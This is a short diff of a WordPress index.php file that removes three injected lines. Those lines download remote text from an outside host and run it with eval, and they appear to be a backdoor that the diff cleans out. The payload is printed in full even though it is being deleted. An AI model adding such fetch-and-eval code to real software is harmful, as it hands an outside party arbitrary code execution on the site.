@@ -1,7 +1,4 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/mlaplus.txt'));
-$url = "?> ".$url;
-eval($url);
 
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
